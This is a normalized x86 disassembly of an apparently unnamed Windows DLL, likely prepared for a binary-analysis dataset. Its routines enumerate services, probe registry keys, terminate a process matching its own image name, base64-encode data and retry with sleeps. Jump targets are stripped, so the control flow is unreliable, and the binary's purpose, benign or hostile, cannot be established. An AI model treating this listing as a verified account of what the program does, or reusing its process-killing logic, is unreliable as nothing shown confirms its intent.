mov edi [ ebp - 0xac4 ]
lea edx [ ebp - 0xab4 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ ebp - 0xaa8 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
mov ebx eax
mov [ ebp - 0xab4 ] ebx
mov [ ebp - 0x4 ] 0x0
push 0x4
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov esi eax
mov [ ebp - 0xab0 ] esi
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000eddc
mov eax [ ebp - 0xabc ]
jmp r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac0 ]
push edx
lea eax [ ebp - 0xab8 ]
push eax
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push esi
mov edi [ EnumServicesStatusExW@IAT ]
call edi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xab8 ]
push ecx
push 0x8
push ebx
call [ HeapAlloc@IAT ]
mov [ ebp - 0xaac ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
push 0x0
push 0x0
lea edx [ ebp - 0xac0 ]
push edx
lea eax [ ebp - 0xacc ]
push eax
mov ecx [ ebp - 0xab8 ]
push ecx
mov edx [ ebp - 0xaac ]
push edx
push 0x3
push 0x10
push 0x0
push esi
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x2
call sub_1006e040
lea edx [ ebp - 0x30 ]
mov eax 0x3
call sub_1006e040
xor edi edi
mov [ ebp - 0xac8 ] edi
nop
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x898 ]
push ecx
mov ecx 0x104
call sub_10012950
mov edx edi
imul edx edx 0x2c
mov eax [ ebp - 0xaac ]
mov ecx [ edx + eax ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x898 ]
call sub_10050c60
push 0x80000002
lea ebx [ ebp - 0x690 ]
lea ecx [ ebp - 0x898 ]
call sub_10011ba0
add esp 0x4
test eax eax
je r-xdata
inc edi
mov [ ebp - 0xac8 ] edi
mov esi [ ebp - 0xab0 ]
jmp r-xdata
push esi
lea edx [ ebp - 0xaa0 ]
push edx
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x898 ]
mov edx 0x80000002
call sub_1006a230
add esp 0xc
test eax eax
jne r-xdata
cmp edi [ ebp - 0xac0 ]
jae r-xdata
lea ecx [ ebp - 0xaa0 ]
push ecx
call [ PathFileExistsW@IAT ]
mov [ ebp - 0xabc ] eax
test eax eax
jne r-xdata
mov esi [ ebp - 0xab0 ]
sub_1000eddc
test esi esi
je r-xdata
mov eax [ ebp - 0xaac ]
test eax eax
je r-xdata
push esi
call [ CloseServiceHandle@IAT ]
retn
push eax
push 0x0
mov edx [ ebp - 0xab4 ]
push edx
call [ HeapFree@IAT ]
sub_1000ee10
push ebp
mov ebp esp
sub esp 0x648
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ ebp - 0x644 ] edi
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x640 ]
push eax
push edi
mov [ ebp - 0x640 ] 0x22c
call [ Process32FirstW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push esi
call [ GetCurrentProcessId@IAT ]
mov ebx [ OpenProcess@IAT ]
push eax
push 0x0
push 0x400
mov [ ebp - 0x648 ] eax
call ebx
mov esi eax
test esi esi
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov eax 0x2
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edi [ CloseHandle@IAT ]
call edi
jmp r-xdata
mov esi [ CloseHandle@IAT ]
call esi
push edi
call esi
pop esi
pop ebx
mov eax 0x4
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x638 ]
cmp eax [ ebp - 0x648 ]
je r-xdata
mov esi [ ebp - 0x644 ]
lea eax [ ebp - 0x640 ]
push eax
push esi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
push eax
push 0x0
push 0x400
call ebx
mov esi eax
test esi esi
je r-xdata
push esi
call edi
pop esi
pop ebx
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push esi
call [ GetProcessImageFileNameW@IAT ]
push esi
test eax eax
je r-xdata
call edi
call edi
lea eax [ ebp - 0x20c ]
push eax
lea ecx [ ebp - 0x414 ]
push ecx
call [ StrCmpW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x638 ]
push edx
push eax
push 0x1
call ebx
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x644 ]
push ecx
call edi
pop esi
pop ebx
mov eax 0x5
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ TerminateProcess@IAT ]
push esi
test eax eax
je r-xdata
call edi
mov edx [ ebp - 0x644 ]
push edx
call edi
mov ecx [ ebp - 0x4 ]
pop esi
pop ebx
xor ecx ebp
mov eax 0x6
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000eff4
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_10043bb1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1000f020
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1005f830
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1000f050
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1000f0b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x18
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov eax esi
call sub_10073b20
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x18
test eax eax
je r-xdata
sub_1000f103
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003d74d
add esp 0x14
pop ebp
retn
sub_1000f130
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
mov [ edx ] ecx
cmp [ edi ] ebx
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
cmp edx [ edi ]
pop edi
pop esi
sete al
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edx ] eax
je r-xdata
mov esi [ edi ]
mov cl [ esi ]
cmp cl 0x80
jae r-xdata
cmp cl 0xc0
jb r-xdata
inc esi
movzx eax cl
mov [ edi ] esi
jmp r-xdata
inc [ edi ]
movzx eax cl
cmp cl 0xe0
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0x0
jne r-xdata
cmp cl 0xf0
jae r-xdata
and eax 0x1f
mov ecx 0x1
cmp eax 0x10ffff
ja r-xdata
mov [ ecx ] 0x1
cmp cl 0xf8
jae r-xdata
and eax 0xf
mov ecx 0x2
jmp r-xdata
inc esi
mov [ edi ] esi
test ecx ecx
jle r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x1c
mov ecx [ edx ]
mov ebx [ ebp + 0x10 ]
mov [ ecx ] ax
add [ edx ] 0x2
cmp [ edi ] ebx
jne r-xdata
and eax 0x3
cmp cl 0xfc
sbb ecx ecx
add ecx 0x5
jne r-xdata
and eax 0x7
mov ecx 0x3
jmp r-xdata
sub ebx esi
lea edx [ ecx + 0x1 ]
cmp ebx edx
jl r-xdata
mov edx [ ebp + 0x20 ]
jmp r-xdata
inc esi
mov [ edi ] esi
jmp r-xdata
mov dl [ esi ]
lea ebx [ edx + 0x80 ]
cmp bl 0x3f
ja r-xdata
movzx edx dl
and edx 0x3f
shl eax 0x6
dec ecx
inc esi
or eax edx
mov [ edi ] esi
test ecx ecx
jg r-xdata
sub_1000f245
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
lea eax [ ecx + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_10063545
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_1000f28b
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_100654c7
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1000842a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_1000f340
push ebp
mov ebp esp
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0x18 ]
mov [ edi ] 0x0
mov [ edx ] ecx
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
pop ebp
retn
push ebx
mov eax [ esi ]
movzx ecx [ eax ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x10 ]
inc eax
mov [ esi ] eax
movzx ecx [ eax ]
mov [ ebx ] ecx
mov ebx [ ebp + 0x14 ]
inc eax
mov [ esi ] eax
movzx ecx [ eax ]
mov [ ebx ] ecx
inc eax
mov [ esi ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov eax [ edx ]
mov edx ecx
sar edx 0x2
and edx 0x3f
movzx edx [ edx + r--data ]
mov [ eax ] dl
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
mov ebx edx
shl ecx 0x4
sar ebx 0x4
add ebx ecx
and ebx 0x3f
movzx ecx [ ebx + r--data ]
mov [ eax + 0x1 ] cl
mov ecx [ ebp + 0x14 ]
mov ecx [ ecx ]
add [ edi ] 0x3
mov ebx ecx
sar ebx 0x6
lea edx [ ebx + edx * 4 ]
and edx 0x3f
movzx edx [ edx + r--data ]
mov [ eax + 0x2 ] dl
mov edx [ ebp + 0x18 ]
and ecx 0x3f
movzx ecx [ ecx + r--data ]
mov [ eax + 0x3 ] cl
add eax 0x4
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ edi ] eax
jb r-xdata
pop ebx
sub_1000f410
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
retn
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
sub_1000f461
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_1007fa40
inc eax
push eax
push edi
push esi
call sub_1007ec40
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_1000f514
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_100293e8
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100637b6
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
sub_1000f5b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089b0c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
xor edx edx
mov [ ebp - 0xbc ] 0x7
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xd0 ] dx
push ecx
mov ecx [ ebp + 0xc ]
push eax
lea edx [ ebp - 0xd0 ]
mov [ ebp - 0x4 ] ebx
call sub_1006aa10
mov esi eax
cmp esi ebx
je r-xdata
cmp [ ebp - 0xc0 ] ebx
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x138
call sub_10069020
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x90 ]
lea esi [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ ebx + 0xf ]
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0xa0 ] esi
jb r-xdata
push edi
lea ecx [ ebp - 0xd0 ]
call sub_1003e4b0
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xc6
call sub_10069020
xor edx edx
lea eax [ ebp - 0x3c ]
mov [ ebp - 0xb4 ] dx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
lea edx [ eax + 0x2 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] dx
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0xbc ] 0x8
jb r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x35
call sub_10069020
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x98 ]
lea esi [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xf
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0xa0 ] esi
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov edx [ ebp - 0xd0 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0xa0 ] 0x7
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xb4 ] dx
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_1000a86e
add esp 0x4
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xb4 ]
call sub_10034100
lea edx [ ebp - 0xb4 ]
mov ecx 0xf
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0xa0 ] esi
jb r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0xbc ] esi
jb r-xdata
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0xd0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0xd0 ]
push edx
call sub_1000a86e
add esp 0x4
sub_1000f870
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x8 ] 0x0
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebp - 0x10 ] eax
call sub_1007f580
mov eax [ ebp + 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
add eax 0x54
call sub_10001ba0
mov eax [ ebp - 0x10 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call esi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
sub_1000f8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008815c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x2e4 ] 0x0
mov [ ebp - 0xe0 ] ebx
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x1d
call sub_10071e30
lea edx [ ebp - 0x34 ]
mov eax 0x22
call sub_10071e30
xor edi edi
mov ecx edx
cmp [ ebx + 0xb0 ] edi
jne r-xdata
mov eax 0x64
jmp r-xdata
xor eax eax
mov [ ebp - 0x50 ] ax
mov eax ecx
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] edi
lea esi [ eax + 0x2 ]
lea ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x50 ]
call sub_10034100
mov [ ebp - 0x4 ] edi
movzx eax [ ebx + 0x20 ]
cdq
push edx
push eax
lea esi [ ebp - 0xdc ]
call sub_1001b920
mov edi eax
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0xc0 ]
add ebx 0x4
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10005090
push eax
mov edx r--data
lea esi [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x2
call sub_100519f0
add esp 0x14
mov ecx eax
mov eax edi
lea edi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x3
call sub_1006b070
mov ecx eax
mov edi [ ebp - 0xe0 ]
lea eax [ edi + 0x24 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x4
call sub_1006acf0
push eax
lea ecx [ edi + 0x2c4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10033f90
cmp [ ebp - 0x58 ] 0x8
jb r-xdata
xor ebx ebx
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov esi 0x7
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] cx
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
cmp [ ebp - 0x74 ] 0x8
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] dx
jb r-xdata
mov ecx [ ebp - 0x88 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xc8 ] 0x8
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_1000a86e
add esp 0x4
lea esi [ edi + 0xb8 ]
push esi
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x3c ] 0x8
jb r-xdata
mov edi r--data
mov edx 0x104
mov eax esi
sub edi esi
nop
xor eax eax
mov eax [ ebp - 0x50 ]
push eax
call sub_1000a86e
add esp 0x4
cmp edx ebx
jne r-xdata
movzx ecx [ edi + eax ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1000fb4a
push 0x10
push r--data
call sub_1007fad0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1005b670
mov [ eax ] 0x9
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10041241
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000fc1b
mov eax [ ebp - 0x1c ]
call sub_1003a6bb
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_1000fc50
call sub_1006d5c0
test eax eax
jne r-xdata
mov eax 0x1
retn
call sub_100150a0
test eax eax
jne r-xdata
call sub_10004ab0
test eax eax
jne r-xdata
call sub_100311a0
test eax eax
jne r-xdata
call sub_10040140
test eax eax
jne r-xdata
call sub_10055ae0
test eax eax
jne r-xdata
call sub_10067b60
test eax eax
je r-xdata
call sub_10046be0
test eax eax
jne r-xdata
call sub_1006af40
test eax eax
jne r-xdata
push eax
push eax
push sub_10026510
push sub_10043100
push eax
push eax
call sub_10056858
add esp 0x18
push eax
call [ CloseHandle@IAT ]
xor eax eax
retn
sub_1000fce0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x8
push esi
mov esi [ ebp + 0x8 ]
inc [ esi + 0x54 ]
cmp [ esi + 0x54 ] 0x5
push edi
jae r-xdata
mov [ esi + 0x50 ] 0xff000001
mov eax [ esi + 0x58 ]
cmp eax [ esi + 0x5c ]
jge r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
jmp r-xdata
mov edi [ GetSystemTimeAsFileTime@IAT ]
mov edx [ esi ]
xor eax eax
cmp [ esi + 0x50 ] eax
mov ecx esi
setne al
add eax 0x4
mov [ esi + 0x48 ] eax
mov eax [ edx + 0x4 ]
call eax
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x2
call eax
lea ecx [ esp + 0x8 ]
push ecx
call edi
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
mov [ esi + 0x68 ] edx
mov edx [ esi ]
mov [ esi + 0x6c ] eax
mov eax [ edx + 0x14 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
mov [ esi + 0x48 ] 0x3
call eax
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
mov ecx [ esi + 0x60 ]
imul ecx ecx 0x3e8
push ecx
call [ Sleep@IAT ]
inc [ esi + 0x58 ]
mov edx [ esi + 0x58 ]
cmp edx [ esi + 0x5c ]
jl r-xdata
sub_1000fd97
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
